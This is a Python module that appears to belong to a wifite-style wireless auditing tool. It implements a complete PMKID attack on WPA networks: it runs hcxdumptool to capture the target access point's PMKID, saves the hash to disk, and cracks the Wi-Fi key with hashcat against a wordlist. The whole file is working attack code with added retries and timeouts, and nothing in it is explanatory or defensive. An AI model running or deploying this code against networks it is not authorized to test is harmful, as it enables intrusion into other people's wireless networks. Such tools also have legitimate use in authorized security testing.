#!/usr/bin/env python
# -*- coding: utf-8 -*-

from ..model.attack import Attack
from ..config import Configuration
from ..tools.hashcat import HcxDumpTool, HcxPcapTool, Hashcat
from ..util.color import Color
from ..util.timer import Timer
from ..model.pmkid_result import CrackResultPMKID

from threading import Thread
import os
import time
import re
import logging

logger = logging.getLogger(__name__)

class AttackPMKID(Attack):
    """Enhanced PMKID attack with adaptive timeouts and better error handling"""
    
    # Adaptive timeout settings
    MIN_TIMEOUT = 30
    MAX_TIMEOUT = 300
    INITIAL_TIMEOUT = 120
    
    # Monitoring settings
    CHECK_INTERVAL = 0.5  # seconds
    STALE_THRESHOLD = 5  # seconds without new PMKID attempts

    def __init__(self, target):
        super(AttackPMKID, self).__init__(target)
        self.crack_result = None
        self.success = False
        self.pcapng_file = Configuration.temp('pmkid.pcapng')
        self.adaptive_timeout = self.INITIAL_TIMEOUT
        self.capture_start_time = None

    def get_existing_pmkid_file(self, bssid):
        '''Load PMKID Hash from previously-captured hash'''
        if not os.path.exists(Configuration.wpa_handshake_dir):
            return None

        bssid_clean = bssid.lower().replace(':', '')
        file_re = re.compile('.*pmkid_.*\.16800')
        
        try:
            for filename in os.listdir(Configuration.wpa_handshake_dir):
                pmkid_filename = os.path.join(Configuration.wpa_handshake_dir, filename)
                
                if not os.path.isfile(pmkid_filename):
                    continue
                if not re.match(file_re, pmkid_filename):
                    continue

                with open(pmkid_filename, 'r') as pmkid_handle:
                    pmkid_hash = pmkid_handle.read().strip()
                    if pmkid_hash.count('*') < 3:
                        continue
                    
                    existing_bssid = pmkid_hash.split('*')[1].lower().replace(':', '')
                    if existing_bssid == bssid_clean:
                        Color.pl('{+} {G}Found existing PMKID: {C}%s{W}' % pmkid_filename)
                        return pmkid_filename
        except Exception as e:
            logger.warning("Error loading existing PMKID: %s" % str(e))
        
        return None

    def run(self):
        '''Performs PMKID attack with improved error handling'''
        from ..util.process import Process
        
        # Dependency check
        dependencies = [
            Hashcat.dependency_name,
            HcxDumpTool.dependency_name,
            HcxPcapTool.dependency_name
        ]
        missing_deps = [dep for dep in dependencies if not Process.exists(dep)]
        
        if len(missing_deps) > 0:
            Color.pl('{!} Skipping PMKID attack, missing: {O}%s{W}' % ', '.join(missing_deps))
            return False

        pmkid_file = None

        # Try to load existing PMKID
        if Configuration.ignore_old_handshakes == False:
            pmkid_file = self.get_existing_pmkid_file(self.target.bssid)

        # Capture new PMKID if needed
        if pmkid_file is None:
            pmkid_file = self._capture_pmkid_with_retry()

        if pmkid_file is None:
            return False

        # Crack the PMKID
        try:
            self.success = self.crack_pmkid_file(pmkid_file)
        except KeyboardInterrupt:
            Color.pl('\n{!} {R}Interrupted{W}')
            self.success = False
            return False

        return True

    def _capture_pmkid_with_retry(self, max_attempts=2):
        """Capture PMKID with retry logic"""
        for attempt in range(max_attempts):
            Color.pl('{+} {G}PMKID Capture Attempt {W}{C}%d/%d{W}' 
                    % (attempt + 1, max_attempts))
            
            pmkid_file = self.capture_pmkid()
            if pmkid_file is not None:
                return pmkid_file
            
            if attempt < max_attempts - 1:
                Color.pl('{!} Retrying in 10 seconds...')
                time.sleep(10)
        
        return None

    def capture_pmkid(self):
        '''Captures PMKID hash with monitoring'''
        self.keep_capturing = True
        self.timer = Timer(self.adaptive_timeout)
        self.capture_start_time = time.time()
        last_check = time.time()

        # Start hcxdumptool in background
        dumptool_thread = Thread(target=self.dumptool_thread)
        dumptool_thread.daemon = True
        dumptool_thread.start()

        # Repeatedly check for PMKID hash
        pmkid_hash = None
        pcaptool = HcxPcapTool(self.target)
        check_count = 0
        
        while self.timer.remaining() > 0:
            try:
                pmkid_hash = pcaptool.get_pmkid_hash(self.pcapng_file)
                if pmkid_hash is not None:
                    break

                check_count += 1
                if check_count % 4 == 0:  # Show status every 2 seconds
                    elapsed = time.time() - self.capture_start_time
                    Color.pattack('PMKID', self.target, 'CAPTURE',
                            'Listening ({C}%.1fs{W}/{C}%.1fs{W})' 
                            % (elapsed, self.timer.remaining()))
                
                time.sleep(self.CHECK_INTERVAL)

            except Exception as e:
                logger.warning("Error checking PMKID: %s" % str(e))
                time.sleep(1)

        self.keep_capturing = False

        if pmkid_hash is None:
            Color.pattack('PMKID', self.target, 'CAPTURE', '{R}Failed{W}')
            return None

        Color.clear_entire_line()
        Color.pattack('PMKID', self.target, 'CAPTURE', '{G}Captured{W}')
        pmkid_file = self.save_pmkid(pmkid_hash)
        return pmkid_file

    def crack_pmkid_file(self, pmkid_file):
        '''Cracks PMKID with improved error handling'''
        if Configuration.wordlist is None:
            Color.pl('{!} {O}Not cracking PMKID: no wordlist specified{W}')
            return False

        try:
            Color.clear_entire_line()
            Color.pattack('PMKID', self.target, 'CRACK', 
                    'Cracking with {C}%s{W}...\n' % os.path.basename(Configuration.wordlist))
            
            key = Hashcat.crack_pmkid(pmkid_file)

            if key is None:
                Color.clear_entire_line()
                Color.pattack('PMKID', self.target, '{R}CRACK',
                        '{R}Failed{O} - Key not in wordlist\n{W}')
                return False
            else:
                Color.clear_entire_line()
                Color.pattack('PMKID', self.target, '{G}CRACKED', '{C}Key: {G}%s{W}\n' % key)
                self.crack_result = CrackResultPMKID(self.target.bssid, self.target.essid,
                        pmkid_file, key)
                self.crack_result.dump()
                return True

        except Exception as e:
            logger.exception("Error cracking PMKID: %s" % str(e))
            Color.pl('{!} {R}Cracking error: {O}%s{W}' % str(e))
            return False

    def dumptool_thread(self):
        '''Runs hcxdumptool until completion or stop signal'''
        try:
            dumptool = HcxDumpTool(self.target, self.pcapng_file)

            while self.keep_capturing and dumptool.poll() is None:
                time.sleep(0.5)

            dumptool.interrupt()
        except Exception as e:
            logger.warning("Dumptool error: %s" % str(e))

    def save_pmkid(self, pmkid_hash):
        '''Saves PMKID hash to filesystem'''
        if not os.path.exists(Configuration.wpa_handshake_dir):
            os.makedirs(Configuration.wpa_handshake_dir)

        essid_safe = re.sub('[^a-zA-Z0-9]', '', self.target.essid)
        bssid_safe = self.target.bssid.replace(':', '-')
        date = time.strftime('%Y-%m-%dT%H-%M-%S')
        pmkid_file = 'pmkid_%s_%s_%s.16800' % (essid_safe, bssid_safe, date)
        pmkid_file = os.path.join(Configuration.wpa_handshake_dir, pmkid_file)

        Color.p('\n{+} Saving PMKID to {C}%s{W} ' % pmkid_file)
        
        try:
            with open(pmkid_file, 'w') as pmkid_handle:
                pmkid_handle.write(pmkid_hash)
                pmkid_handle.write('\n')
            Color.pl('{G}saved{W}')
        except Exception as e:
            logger.exception("Error saving PMKID: %s" % str(e))
            Color.pl('{R}failed{W}')
            return None

        return pmkid_file
